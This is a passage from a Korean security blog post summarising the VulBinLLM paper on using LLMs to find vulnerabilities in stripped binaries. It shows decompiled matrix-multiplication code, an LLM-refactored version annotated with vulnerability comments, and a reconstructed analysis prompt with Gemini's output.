&#xACC4;&#xC815;&#xB3C4; &#xB9CE;&#xC774; &#xC0AC;&#xB791;&#xD574;&#xC8FC;&#xC138;&#xC694;&#x2026;! <a href="https://x.com/hackyboiz">@hackyboiz</a></p></blockquote><p>&#xC774;&#xB807;&#xAC8C; LLM&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xB108;&#xBB34; &#xD655;&#xC2E4;&#xD574; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. </p><h2 id="2-Stripped-Binary"><a href="#2-Stripped-Binary" class="headerlink" title="2. Stripped Binary"></a>2. Stripped Binary</h2><p> &#xBA3C;&#xC800; &#x2018;Stripped Binary&#x2019;&#xAC00; &#xBB54;&#xC9C0; &#xC54C;&#xC544;&#xC57C;&#xACA0;&#xC8E0;? &#xC6B0;&#xB9AC;&#xAC00; &#xBCF4;&#xD1B5; C&#xB098; C++ &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xC11C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xBA74; &#xC2E4;&#xD589; &#xD30C;&#xC77C;(&#xBC14;&#xC774;&#xB108;&#xB9AC;)&#xC774; &#xBFC5; &#xD558;&#xACE0; &#xB098;&#xC624;&#xC796;&#xC544;&#xC694;? &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C;&#xB294; &#xD568;&#xC218; &#xC774;&#xB984;&#xC774;&#xB098; &#xBCC0;&#xC218; &#xC774;&#xB984; &#xAC19;&#xC740; &#xC815;&#xBCF4;(&#xC2EC;&#xBCFC;)&#xAC00; &#xB2E4; &#xB4E4;&#xC5B4;&#xC788;&#xC5B4;&#xC11C; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xAC00; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xADFC;&#xB370; &#xBC30;&#xD3EC;&#xD560; &#xB54C;&#xB294;? &#xC6A9;&#xB7C9;&#xB3C4; &#xC904;&#xC774;&#xACE0;, &#xBB34;&#xC5C7;&#xBCF4;&#xB2E4; &#xC800;&#xD76C; &#xAC19;&#xC740; &#xD574;&#xCEE4;&#xB4E4;&#xC774; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4;&#xB824;&#xACE0; &#xC774; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xC2F9; &#xB2E4; &#xB0A0;&#xB824;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;. &#xC774;&#xAC8C; &#xBC14;&#xB85C; &#x2018;Stripped Binary&#x2019;&#xC5D0;&#xC694;. &#xD568;&#xC218; &#xC774;&#xB984;&#xC740; <code>sub_401000</code> &#xC774;&#xB534; &#xC2DD;&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xACE0;, &#xBCC0;&#xC218;&#xAC00; &#xBB54;&#xC9C0;&#xB3C4; &#xBAA8;&#xB974;&#xACA0;&#xACE0;&#x2026; &#xC774;&#xAC78; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC74; &#xC9C4;&#xC9DC; &#xB054;&#xCC0D;&#xD55C; &#xC77C;&#xC785;&#xB2C8;&#xB2E4;. &#xC2DC;&#xAC04;&#xACFC; &#xB178;&#xB825;&#xC774; &#xC5C4;&#xCCAD;&#xB098;&#xAC8C; &#xAC08;&#xB824;&#xB098;&#xAC00;&#xC8E0;. &#xCC98;&#xC74C; CTF&#xB098; &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC744; &#xD560; &#xB54C; &#xC2A4;&#xD2B8;&#xB9BD;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB9CC; &#xBCF4;&#xB2E4;&#xAC00; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD560; &#xAE30;&#xD68C;&#xAC00; &#xC788;&#xC5C8;&#xB294;&#xB370;, &#xC815;&#xB9D0; &#xC2E0;&#xC138;&#xACC4;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B; &#xC544;&#xB2C8; &#xBD84;&#xC11D;&#xC774; &#xC774;&#xB807;&#xAC8C; &#xC27D;&#xB2E4;&#xACE0;?(&#xADF8;&#xB798;&#xC11C; &#xADF8; &#xB54C;&#xBD80;&#xD130; &#xC624;&#xD508;&#xC18C;&#xC2A4;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xACE0; &#xC788;&#xB294;&#x2026;)</p><h2 id="3-&#xC554;&#xD2BC;-&#xADF8;&#xB798;&#xC11C;-LLM&#xC73C;&#xB85C;-&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xC5B4;&#xB5BB;&#xAC8C;-&#xCC3E;&#xACA0;&#xB2E4;&#xB294;&#xAC74;&#xB370;"><a href="#3-&#xC554;&#xD2BC;-&#xADF8;&#xB798;&#xC11C;-LLM&#xC73C;&#xB85C;-&#xCDE8;&#xC57D;&#xC810;&#xC744;-&#xC5B4;&#xB5BB;&#xAC8C;-&#xCC3E;&#xACA0;&#xB2E4;&#xB294;&#xAC74;&#xB370;" class="headerlink" title="3. &#xC554;&#xD2BC; &#xADF8;&#xB798;&#xC11C; LLM&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC3E;&#xACA0;&#xB2E4;&#xB294;&#xAC74;&#xB370;?"></a>3. &#xC554;&#xD2BC; &#xADF8;&#xB798;&#xC11C; LLM&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC3E;&#xACA0;&#xB2E4;&#xB294;&#xAC74;&#xB370;?</h2><p>&#xC774; &#xB17C;&#xBB38;&#xC758; &#xD575;&#xC2EC; &#xBAA9;&#xD45C;&#xB294; <strong>LLM&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; Stripped Binary&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xCC3E;&#xC544;&#xB0B4;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;, VulBinLLM&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xADF8;&#xB0E5; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF5;&#xBD99;&#xD574;&#xC11C; LLM&#xC5D0; &#x201C;&#xC57C;, &#xCDE8;&#xC57D;&#xC810; &#xCC3E;&#xC544;&#xC918;&#x201D; &#xD558;&#xBA74; &#xC798; &#xB420;&#xAE4C;&#xC694;? &#xB124;, &#xAC04;&#xB2E8;&#xD55C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xB354; &#xD06C;&#xACE0; &#xBC29;&#xB300;&#xD55C; &#xC591;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294;? &#xADF8;&#xAC83;&#xB3C4; stripped &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB77C; &#xD568;&#xC218;&#xBA85;, &#xBCC0;&#xC218;&#xBA85;&#xB3C4; &#xC81C;&#xB300;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74;? &#xD5DB;&#xC18C;&#xB9AC;&#xD558;&#xAE30; &#xB531; &#xC88B;&#xC8E0;. &#xC774; &#xB17C;&#xBB38;&#xC758; &#xC9C4;&#xC9DC; &#xAE30;&#xC5EC;&#xC810;&#xC740; &#xBC14;&#xB85C; &#xC774; &#x2018;&#xC5B4;&#xB5BB;&#xAC8C;?&#x2019;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xCCB4;&#xACC4;&#xC801;&#xC778; &#xAD6C;&#xC870;&#xB97C; &#xC124;&#xACC4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/15/j0ker/llm_part2/kr/figure1.png" alt="image.png"></p><p>&#xADF8;&#xB0E5; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; LLM&#xC5D0; &#xB123;&#xB294; &#xAC8C; &#xC544;&#xB2C8;&#xB77C; <strong>&#xB514;&#xCEF4;&#xD30C;&#xC77C; -&gt; &#xCD5C;&#xC801;&#xD654; -&gt; &#xC7A5;&#xAE30; &#xAE30;&#xC5B5; &#xC0DD;&#xC131; -&gt; LLM &#xBD84;&#xC11D;</strong> &#xC774;&#xB77C;&#xB294; &#xBA85;&#xD655;&#xD55C; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC744; &#xAD6C;&#xCD95;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#x2018;&#xCD5C;&#xC801;&#xD654;&#x2019;&#xC640; &#x2018;&#xC7A5;&#xAE30; &#xAE30;&#xC5B5;&#x2019; &#xBD80;&#xBD84;&#xC774; &#xC774; &#xC5F0;&#xAD6C;&#xC758; &#xD575;&#xC2EC;&#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-&#xB514;&#xCEF4;&#xD30C;&#xC77C;-&#xCD5C;&#xC801;&#xD654;-Decompilation-Optimization-LLM&#xC744;-&#xC704;&#xD55C;-&#xCF54;&#xB4DC;-&#xC815;&#xC81C;"><a href="#1-&#xB514;&#xCEF4;&#xD30C;&#xC77C;-&#xCD5C;&#xC801;&#xD654;-Decompilation-Optimization-LLM&#xC744;-&#xC704;&#xD55C;-&#xCF54;&#xB4DC;-&#xC815;&#xC81C;" class="headerlink" title="1) &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCD5C;&#xC801;&#xD654; (Decompilation Optimization): LLM&#xC744; &#xC704;&#xD55C; &#xCF54;&#xB4DC; &#xC815;&#xC81C;"></a>1) &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCD5C;&#xC801;&#xD654; (Decompilation Optimization): LLM&#xC744; &#xC704;&#xD55C; &#xCF54;&#xB4DC; &#xC815;&#xC81C;</h3><p>&#xCCAB; &#xBC88;&#xC9F8; &#xD575;&#xC2EC;&#xC740; &#x2018;&#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCD5C;&#xC801;&#xD654;&#x2019;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; &#xC608;&#xC2DC;&#xB294; &#xC774; &#xACFC;&#xC815;&#xC744; &#xC544;&#xC8FC; &#xBA85;&#xD655;&#xD558;&#xAC8C; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCD5C;&#xC801;&#xD654; &#xC804;(Ghidra):</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1, <span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span>{local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-keyword">for</span> (*(<span class="hljs-keyword">long</span> *)local_34 = <span class="hljs-number">0</span>; *(<span class="hljs-keyword">long</span> *)local_34 &lt; R1; local_34++) {<span class="hljs-keyword">for</span> (local_30 = <span class="hljs-number">0</span>; local_30 &lt; C2; local_30++) {(auStack_28)[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (local_2c = <span class="hljs-number">0</span>; local_2c &lt; R2; local_2c++) {auStack_28[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] += *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">0xc</span> + param_2 + (<span class="hljs-keyword">long</span>)local_30 * <span class="hljs-number">4</span>)* *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_34 * <span class="hljs-number">8</span> + param_1 + (<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">4</span>);}}}}</code></pre><p>&#xBCF4;&#xC2DC;&#xB2E4;&#xC2DC;&#xD53C; &#xBCC0;&#xC218; &#xC774;&#xB984;&#xC740; <code>param_1</code>, <code>local_34</code>, <code>R2</code> &#xCC98;&#xB7FC; &#xC758;&#xBBF8;&#xAC00; &#xC5C6;&#xACE0;, &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xB8E8;&#xD504;&#xBB38;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xC5B4;&#xB5A4; &#xB9E5;&#xB77D;&#xC778;&#xC9C0; &#xBC14;&#xB85C; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD5C;&#xC801;&#xD654; &#xD6C4;(VulBinLLM):</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> input_matrix_1, <span class="hljs-keyword">long</span> input_matrix_2)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// Initialize a matrix to store the result of matrix multiplication</span><span class="hljs-keyword">int</span> result_matrix[row_1][column_2] = {<span class="hljs-number">0</span>};<span class="hljs-comment">// Iterate over each row and column of the result matrix</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; row_1; current_row++) {<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; column_2; current_col++) {<span class="hljs-comment">// Perform matrix multiplication by iterating over the shared dimension</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; row_2; shared_dim++) {<span class="hljs-comment">// Vulnerability: Potential pointer arithmetic issue if column_1 and row_2 are not properly allocated</span><span class="hljs-comment">// Multiply corresponding elements from the input matrices and accumulate the result</span>result_matrix[current_row][current_col] += *((<span class="hljs-keyword">int</span> *)(input_matrix_2 + shared_dim * <span class="hljs-number">12</span> + current_col * <span class="hljs-number">4</span>)) * *((<span class="hljs-keyword">int</span> *)(input_matrix_1 + current_row * <span class="hljs-number">8</span> + shared_dim * <span class="hljs-number">4</span>));}}}}</code></pre><p>&#xCD5C;&#xC801;&#xD654; &#xD6C4; &#xCF54;&#xB4DC;&#xB294; &#xC644;&#xC804;&#xD788; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. local_10&#xB294; result_matrix&#xB85C; &#xB418;&#xACE0; &#xC8FC;&#xC11D;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xBA74;&#xC11C; &#xD568;&#xC218;&#xC758; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xB9E5;&#xB77D;&#xC744; &#xC27D;&#xAC8C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC7A0;&#xC7AC;&#xC801;&#xC778; &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;&#xB3C4; &#xC81C;&#xACF5;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xC27D;&#xAC8C;&#xB3C4; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD588;&#xB294;&#xC9C0; &#xC81C;&#xACF5;&#xD588;&#xB294;&#xC9C0;&#xB294; &#xC548; &#xB098;&#xC640;&#xC788;&#xB294;&#xB370;&#xC694;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774; &#xACB0;&#xACFC;&#xB97C; &#xB2E4;&#xC2DC; &#xC5ED;&#xC73C;&#xB85C; LLM&#xC5D0;&#xAC8C; &#xC8FC;&#xACE0; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xB2EC;&#xB77C;&#xACE0; &#xD55C;&#xB2E4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB098;&#xC635;&#xB2C8;&#xB2E4;.</p><blockquote><p>You are a <strong>world-class cybersecurity expert specializing in reverse engineering</strong>. Your primary task is to analyze raw C code decompiled by Ghidra from a <strong>stripped binary</strong>. You need to refactor this code to maximize readability and, most importantly, <strong>identify and annotate potential security vulnerabilities</strong> for a security audit.</p><p>The input code will lack original symbols, have generic variable names (e.g., <code>param_1</code>, <code>local_10</code>), and use complex pointer arithmetic. Your job is to semantically reconstruct the original developer&#x2019;s intent and analyze it from a security perspective.</p><p><strong>Follow these steps precisely:</strong></p><ol><li><strong>Semantic Analysis &amp; Renaming:</strong><ul><li>Infer the high-level purpose of the function (e.g., string copy, matrix multiplication, network packet processing).</li><li>Rename the function and its parameters (<code>param_1</code>, <code>param_2</code>, etc.) to reflect their inferred purpose (e.g., <code>multiplyMatrix</code>, <code>input_matrix_1</code>, <code>input_matrix_2</code>).</li><li>Rename local variables (<code>local_...</code>, <code>auStack_...</code>) to descriptive names based on their usage (e.g., <code>result_matrix</code>, <code>current_row</code>, <code>current_col</code>).<br>&gt;</li></ul></li><li><p><strong>Code Refactoring for Readability:</strong></p><ul><li>Convert complex pointer arithmetic into more intuitive array or struct notation. For example, transform <code>*(int *)((long)local_2c * 0xc + param_2 + (long)local_30 * 4)</code> into a clearer form like <code>input_matrix_2[shared_dim][current_col]</code>.</li><li>Reconstruct data structures. If memory access patterns suggest a multi-dimensional array, represent it as such.</li><li>Simplify control flow and logic where possible without changing the functionality.</li></ul></li><li><p><strong>Vulnerability Identification &amp; Annotation:</strong></p><ul><li>Scrutinize the code for common C/C++ vulnerabilities, including but not limited to:<ul><li><strong>Buffer Overflows/Underflows:</strong> Unchecked indexing or pointer arithmetic.</li><li><strong>Integer Overflows/Underflows:</strong> Operations that could lead to wrapping.</li><li><strong>Null Pointer Dereferences:</strong> Use of pointers that could be null.</li><li><strong>Use-After-Free:</strong> Accessing memory after it has been freed.</li><li><strong>Information Leakage:</strong> Exposing sensitive data.</li></ul></li><li>For <strong>each potential vulnerability found</strong>, insert a comment in the line immediately preceding the vulnerable code. The comment must start with <code>// Vulnerability:</code> and provide a concise explanation of the potential risk.</li></ul></li><li><p><strong>Add Explanatory Comments:</strong></p><ul><li>Add a high-level comment at the beginning of the function explaining its overall purpose.</li><li>Add comments to explain complex or non-obvious parts of the algorithm.</li></ul></li></ol><p><strong>Here is an example of the desired transformation:</strong></p><p><strong>[INPUT] Raw Decompiled Code from Ghidra:</strong><br><pre><code class="hljs C">&gt;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1, <span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function">&gt;</span>{local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-keyword">for</span> (*(<span class="hljs-keyword">long</span> *)local_34 = <span class="hljs-number">0</span>; *(<span class="hljs-keyword">long</span> *)local_34 &lt; R1; local_34++) {<span class="hljs-keyword">for</span> (local_30 = <span class="hljs-number">0</span>; local_30 &lt; C2; local_30++) {(auStack_28)[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (local_2c = <span class="hljs-number">0</span>; local_2c &lt; R2; local_2c++) {auStack_28[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] += *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">0xc</span> + param_2 + (<span class="hljs-keyword">long</span>)local_30 * <span class="hljs-number">4</span>)* *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_34 * <span class="hljs-number">8</span> + param_1 + (<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">4</span>);}}}&gt;}</code></pre></p><p><strong>[OUTPUT] Optimized Code for Vulnerability Analysis:</strong><br><pre><code class="hljs C">&gt;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> input_matrix_1, <span class="hljs-keyword">long</span> input_matrix_2)</span></span><span class="hljs-function">&gt;</span>{<span class="hljs-comment">// Initialize a matrix to store the result of matrix multiplication</span><span class="hljs-keyword">int</span> result_matrix[row_1][column_2] = {<span class="hljs-number">0</span>};<span class="hljs-comment">// Iterate over each row and column of the result matrix</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; row_1; current_row++) {<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; column_2; current_col++) {<span class="hljs-comment">// Perform matrix multiplication by iterating over the shared dimension</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; row_2; shared_dim++) {<span class="hljs-comment">// Vulnerability: Potential out-of-bounds access if matrix dimensions (R1, C2, R2) are not validated</span><span class="hljs-comment">// before this function call. The pointer arithmetic relies on these external constants.</span><span class="hljs-comment">// Multiply corresponding elements from the input matrices and accumulate the result.</span>result_matrix[current_row][current_col] += *((<span class="hljs-keyword">int</span> *)(input_matrix_2 + shared_dim * <span class="hljs-number">12</span> + current_col * <span class="hljs-number">4</span>)) * *((<span class="hljs-keyword">int</span> *)(input_matrix_1 + current_row * <span class="hljs-number">8</span> + shared_dim * <span class="hljs-number">4</span>));}}}&gt;}</code></pre></p><hr><p>Now, apply this process to the following Ghidra decompiled code. Provide ONLY the optimized C code as your output.</p><p><strong>[YOUR CODE TO ANALYZE GOES HERE]</strong></p></blockquote><p>&#xC774;&#xB807;&#xAC8C; &#xC608;&#xC2DC;&#xAE4C;&#xC9C0; &#xD3EC;&#xD568;&#xB418;&#xC11C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xAC00; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBD10;&#xC57C;&#xD558;&#xB2C8; &#xC608;&#xC2DC;&#xB97C; &#xC81C;&#xC678;&#xD558;&#xACE0; Gemini&#xC5D0; &#xB123;&#xC5B4;&#xBCF4;&#xC8E0;.</p><p>&#xACB0;&#xACFC;:</p><pre><code class="hljs c"><span class="hljs-comment">/**</span><span class="hljs-comment"> * @brief Performs matrix multiplication of matrix_A (R1 x R2) and matrix_B (R2 x C2).</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * This function reconstructs the logic for matrix multiplication. It takes pointers to two</span><span class="hljs-comment"> * matrices, `matrix_A_ptr` and `matrix_B_ptr`, and computes their product. The resulting</span><span class="hljs-comment"> * (R1 x C2) matrix is stored in a local stack variable `result_matrix`.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * The dimensions R1 (rows of A), R2 (cols of A / rows of B), and C2 (cols of B)</span><span class="hljs-comment"> * are assumed to be externally defined constants (e.g., preprocessor macros),</span><span class="hljs-comment"> * which is a common source of vulnerabilities.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Based on the memory access patterns from the decompilation:</span><span class="hljs-comment"> * - matrix_A is treated as an [R1][R2] integer matrix.</span><span class="hljs-comment"> * - matrix_B is treated as an [R2][C2] integer matrix.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Note: The original stack canary check (`in_FS_OFFSET`) has been removed for clarity</span><span class="hljs-comment"> * as it is a compiler-generated security mechanism and not part of the original logic.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * @param matrix_A_ptr  Pointer to the first input matrix (assumed to be flattened R1xR2).</span><span class="hljs-comment"> * @param matrix_B_ptr  Pointer to the second input matrix (assumed to be flattened R2xC2).</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiply_matrices</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *matrix_A_ptr, <span class="hljs-keyword">int</span> *matrix_B_ptr)</span> </span>{    <span class="hljs-comment">// Vulnerability: Null Pointer Dereference</span>    <span class="hljs-comment">// The function does not check if input pointers are NULL before use. If either</span>    <span class="hljs-comment">// `matrix_A_ptr` or `matrix_B_ptr` is NULL, dereferencing them inside the loops</span>    <span class="hljs-comment">// will cause a segmentation fault and crash the application.</span>    <span class="hljs-comment">// To improve readability, we cast the flat input pointers to 2D array pointers.</span>    <span class="hljs-comment">// This mirrors the structured access intended by the original developer.</span>    <span class="hljs-comment">// The pointer arithmetic `(row * stride) + col_offset` is now `[row][col]`.</span>    <span class="hljs-comment">// The strides inferred from Ghidra (`* 8` for A, `* 0xc` for B) suggest R2=2 and C2=3.</span>    <span class="hljs-keyword">int</span> (*matrix_A)[R2] = (<span class="hljs-keyword">int</span> (*)[R2])matrix_A_ptr;    <span class="hljs-keyword">int</span> (*matrix_B)[C2] = (<span class="hljs-keyword">int</span> (*)[C2])matrix_B_ptr;    <span class="hljs-comment">// Vulnerability: Stack Buffer Overflow</span>    <span class="hljs-comment">// The result matrix is allocated on the stack with a size fixed at compile time</span>    <span class="hljs-comment">// via the macros R1 and C2. If the actual dimensions of the input matrices</span>    <span class="hljs-comment">// (determined by the caller) are larger than these compiled constants, the loops</span>    <span class="hljs-comment">// will write past the bounds of `result_matrix`, corrupting the stack.</span>    <span class="hljs-keyword">int</span> result_matrix[R1][C2];    <span class="hljs-comment">// Iterate over each row of the first matrix (matrix_A).</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; R1; current_row++) {        <span class="hljs-comment">// Iterate over each column of the second matrix (matrix_B).</span>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; C2; current_col++) {                        <span class="hljs-comment">// Initialize the target cell in the result matrix.</span>            result_matrix[current_row][current_col] = <span class="hljs-number">0</span>;            <span class="hljs-comment">// Calculate the dot product for the cell (current_row, current_col).</span>            <span class="hljs-comment">// This loop iterates over the shared dimension (columns of A and rows of B).</span>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; R2; shared_dim++) {                                <span class="hljs-comment">// Vulnerability: Integer Overflow</span>                <span class="hljs-comment">// The multiplication of two matrix elements can exceed the maximum value for an `int`,</span>                <span class="hljs-comment">// causing the value to wrap around (undefined behavior for signed integers).</span>                <span class="hljs-comment">// The subsequent accumulation into `result_matrix` could also overflow.</span>                                <span class="hljs-comment">// Vulnerability: Out-of-Bounds Read</span>                <span class="hljs-comment">// The loops iterate based on the external constants R1, R2, and C2. If these</span>                <span class="hljs-comment">// constants do not match the actual allocated sizes of the buffers pointed to</span>                <span class="hljs-comment">// by `matrix_A_ptr` and `matrix_B_ptr`, this operation will read from</span>                <span class="hljs-comment">// out-of-bounds memory, leading to information leakage or a crash.</span>                result_matrix[current_row][current_col] +=                    matrix_A[current_row][shared_dim] * matrix_B[shared_dim][current_col];            }        }    }    <span class="hljs-comment">// The function scope ends here. The `result_matrix` is destroyed upon returning.</span>    <span class="hljs-comment">// In a real-world scenario, its contents would likely have been copied to an</span>    <span class="hljs-comment">// output parameter pointer before the function returns.</span>}</code></pre><p>&#xBB54;&#xAC00; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xB354; &#xB514;&#xD14C;&#xC77C;&#xD558;&#xAC8C; &#xC8FC;&#xB294;&#xB370;&#xC694; &#xBB50; &#xC5B4;&#xCA0C;&#xB4E0;(?) &#xACB0;&#xACFC;&#xBB3C;&#xC740; &#xAD1C;&#xCC2E;&#xC544; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B; &#xB108;&#xBB34; &#xC124;&#xBA85;&#xC774; &#xB514;&#xD14C;&#xC77C;&#xD558;&#xB2E4;&#xAC70;&#xB098; &#xC601;&#xC5B4;&#xB97C; &#xC4F0;&#xB294; &#xB4F1; &#xB514;&#xD14C;&#xC77C;&#xD55C; &#xBD80;&#xBD84;&#xB4E4;&#xC740; &#xB354; 